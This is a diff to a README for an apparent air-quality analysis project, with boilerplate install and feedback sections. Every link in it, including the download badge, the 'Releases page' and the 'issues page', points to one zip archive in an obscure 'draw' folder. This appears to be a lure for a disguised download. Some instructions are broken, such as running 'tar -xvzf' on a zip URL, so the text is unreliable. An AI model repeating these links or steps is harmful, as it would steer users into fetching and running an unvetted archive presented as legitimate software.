@@ -1,6 +1,6 @@
 # 🌍 indian-air-pollution - Analyze Air Quality Easily
 
-[![Download](https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip)
+[![Download](https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip%20Release-brightgreen)](https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip)
 
 ## 📌 Project Overview
 Air pollution poses a critical public health challenge in India. This project analyzes historical air quality data from 26 major cities to identify pollution patterns and forecast PM2.5 levels. It processes raw data from various sources, conducts extensive exploratory data analysis, and deploys a predictive model via an interactive web dashboard.
@@ -19,9 +19,9 @@ To run this application smoothly, ensure your system meets the following require
 * Internet connection for the initial data download
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip). You will find the latest release files there.
+To get started, [visit this page to download](https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip). You will find the latest release files there.
 
-1. Go to the Releases page by clicking [here](https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip).
+1. Go to the Releases page by clicking [here](https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip).
 2. Locate the latest version of the application.
 3. Download the file suitable for your operating system.
 4. Follow the installation instructions below:
@@ -38,9 +38,9 @@ To get started, [visit this page to download](https://raw.githubusercontent.com/
    - Launch the application from the Applications folder.
 
 3. **For Linux:**
-   - Download the `https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip` file.
+   - Download the `https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip` file.
    - Open a terminal and navigate to the download directory.
-   - Extract the files using the command: `tar -xvzf https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip`
+   - Extract the files using the command: `tar -xvzf https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip`
    - Follow the README file included for specific instructions.
 
 ### 🌐 Running the Application
@@ -60,15 +60,15 @@ If you encounter issues while running the application, consider these steps:
 * Ensure that your system meets the requirements listed above.
 * Check if you have an active internet connection.
 * Restart the application if it becomes unresponsive.
-* If the problem persists, visit the [issues page](https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip) to report or find solutions.
+* If the problem persists, visit the [issues page](https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip) to report or find solutions.
 
 ## 📚 Additional Resources
 * For more detailed analysis methods and algorithms used, check the documentation file included in the application package.
 * Engage with the community and find updates on this project on GitHub.
 
 ## 🗨️ Feedback
-Your feedback is important. Feel free to share your thoughts or suggestions through the [issues page](https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip). 
+Your feedback is important. Feel free to share your thoughts or suggestions through the [issues page](https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip). 
 
 For further queries, consider reaching out via email or posting on forums related to air quality analysis and predictive modeling.
 
-[![Download](https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Sachindurana17/indian-air-pollution/main/draw/air-pollution-indian-disassociate.zip)
+[![Download](https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip%20Release-brightgreen)](https://github.com/Sachindurana17/indian-air-pollution/raw/refs/heads/main/draw/indian_pollution_air_v3.3.zip)
